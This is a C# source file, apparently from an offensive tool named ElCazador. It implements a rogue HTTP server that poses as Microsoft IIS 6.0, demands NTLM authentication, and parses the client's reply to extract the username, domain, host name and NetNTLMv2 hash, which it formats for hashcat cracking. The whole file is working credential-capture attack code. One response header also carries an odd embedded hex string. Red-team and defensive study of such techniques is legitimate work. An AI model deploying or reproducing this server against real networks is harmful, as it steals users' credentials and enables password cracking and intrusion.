using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using ElCazador.Worker.Modules.Servers.Models;
using System.Threading.Tasks;
using ElCazador.Worker.Models;
using ElCazador.Worker.Interfaces;

namespace ElCazador.Worker.Modules.Servers
{
    internal class HTTPServer : BaseModule, IPersistentModule
    {
        private HttpListener Listener { get; set; }
        private int Port { get; set; }

        public bool IsEnabled => throw new NotImplementedException();

        public HTTPServer(IWorkerController controller, int port) : base(controller, "HTTPServer")
        {
            this.Initialize(port);
        }

        public async Task Run()
        {
            await Listen();
        }

        public async Task Stop()
        {
            Listener.Close();

            await Task.CompletedTask;
        }

        private async Task Listen()
        {
            Listener = new HttpListener();
            Listener.Prefixes.Add("http://*:" + Port.ToString() + "/");
            Listener.Start();
            while (true)
            {
                try
                {
                    HttpListenerContext context = Listener.GetContext();
                    await Process(context);
                }
                catch (Exception e)
                {
                    await Controller.Log(Name, e.ToString());
                }
            }
        }

        private async Task Process(HttpListenerContext context)
        {
            await GetNTLMHash(context);

            context.Response.OutputStream.Close();
        }

        private async Task GetNTLMHash(HttpListenerContext context)
        {
            byte[] buffer;
            if (context.Request.Headers.Get("Authorization") == null)
            {
                context.Response.AddHeader("Server", "Microsoft-IIS/6.0");
                context.Response.AddHeader("Date", DateTime.Now.ToString("r"));
                context.Response.ContentType = "text/html";
                context.Response.AddHeader("WWW-Authenticate", "NTLM");
                context.Response.AddHeader("X-Powered-By", "ASP.NET");

                buffer = Encoding.UTF8.GetBytes("<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>");
                context.Response.ContentLength64 = buffer.Length;

                context.Response.StatusCode = (int)HttpStatusCode.Unauthorized;

                context.Response.OutputStream.Write(buffer, 0, buffer.Length);
                context.Response.OutputStream.Flush();
            }
            else
            {
                var authorization = context.Request.Headers.Get("Authorization");

                int index = authorization.IndexOf("NTLM ");

                var auth = (index < 0)
                    ? Convert.FromBase64String(authorization)
                    : Convert.FromBase64String(authorization.Remove(index, "NTLM ".Length));

                var packetType = auth[8];

                if (packetType == 0x01)
                {
                    context.Response.AddHeader("Server", "Microsoft-IIS/6.0");
                    context.Response.AddHeader("Date", DateTime.Now.ToString("r"));
                    context.Response.ContentType = "text/html";
                    context.Response.AddHeader("WWW-Authenticate", string.Format("NTLM {0}", Convert.ToBase64String(new HttpNTLMPacket().Build())));
                    context.Response.AddHeader("X-Powered-By", "ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET");

                    buffer = Encoding.UTF8.GetBytes("<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>");
                    context.Response.ContentLength64 = buffer.Length;

                    context.Response.StatusCode = (int)HttpStatusCode.Unauthorized;

                    context.Response.OutputStream.Write(buffer, 0, buffer.Length);
                    context.Response.OutputStream.Flush();
                }
                else if (packetType == 0x03)
                {
                    short lmHashLen = BitConverter.ToInt16(auth, 12);
                    short lmHashOffset = BitConverter.ToInt16(auth, 16);
                    var lmHash = BitConverter.ToString(auth.Skip(lmHashOffset).Take(lmHashLen).ToArray()).Replace("-", "");

                    var ntHashLen = BitConverter.ToInt16(auth, 20);
                    short ntHashOffset = BitConverter.ToInt16(auth, 24); ;
                    var ntHash = BitConverter.ToString(auth.Skip(ntHashOffset).Take(ntHashLen).ToArray()).Replace("-", "");

                    short userLen = BitConverter.ToInt16(auth, 36);
                    short userOffset = BitConverter.ToInt16(auth, 40);
                    string user = Encoding.Unicode.GetString(auth.Skip(userOffset).Take(userLen).ToArray());

                    short domainLen = BitConverter.ToInt16(auth, 28);
                    short domainOffset = BitConverter.ToInt16(auth, 32);
                    string domain = Encoding.Unicode.GetString(auth.Skip(domainOffset).Take(domainLen).ToArray());

                    short hostNameLen = BitConverter.ToInt16(auth, 44);
                    short hostNameOffset = BitConverter.ToInt16(auth, 48);
                    string hostName = Encoding.Unicode.GetString(auth.Skip(hostNameOffset).Take(hostNameLen).ToArray());

                    await Controller.Add(Name, new User
                    {
                        IPAddress = context.Request.RemoteEndPoint.Address.ToString(),
                        Username = user,
                        Hash = "NetNTLMv2",
                        HashcatFormat = string.Format(
                            "{0}::{1}:{2}:{3}:{4}",
                            user,
                            domain,
                            "6769766563707223",
                            string.Concat(ntHash.Take(32)),
                            string.Concat(ntHash.Skip(32))
                        )
                    });
                }
                else
                {
                    await Controller.Log(Name, "Unknown packet type {0}", packetType.ToString());
                }
            }
        }

        private void Initialize(int port)
        {
            this.Port = port;
        }
    }
}